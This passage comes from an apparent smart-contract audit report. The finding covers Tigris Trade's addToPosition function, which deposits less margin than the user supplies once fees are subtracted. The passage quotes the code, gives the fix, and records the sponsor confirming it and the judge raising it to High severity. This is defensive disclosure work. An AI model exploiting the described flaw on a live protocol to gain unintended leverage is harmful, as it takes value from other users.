uint256_marginAfterFees=_tradeInfo.margin-_handleOpenFees(_tradeInfo.asset,_tradeInfo.margin*_tradeInfo.leverage/1e18,_trader,_tigAsset,false);uint256_positionSize=_marginAfterFees*_tradeInfo.leverage/1e18;_handleDeposit(_tigAsset,_tradeInfo.marginAsset,_tradeInfo.margin,_tradeInfo.stableVault,_permitData,_trader);
Here the third parameter to_handleDepositis not_marginAfterFeesbut_tradeInfo.marginwhich is what the user has input on and is supposed to pay.
Recommended Mitigation Steps
InTrading.addToPositioncall the_handleDepositfunction without subtracting the_feevalue:
_handleDeposit(_trade.tigAsset,_marginAsset,_addMargin,_stableVault,_permitData,_trader);
TriHaz (Tigris Trade) confirmed
Alex the Entreprenerd (judge) increased severity to High and commented:
The Warden has shown how, due to an incorrect computation, less margin is used when adding to a position.While the loss of fees can be considered Medium Severity, I believe that the lack of checks is ultimately allowing for more leverage than intended which not only breaks invariants but can cause further issues (sponsor cited Fees as a defense mechanism against abuse).For this reason, I believe the finding to be of High Severity.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419177303

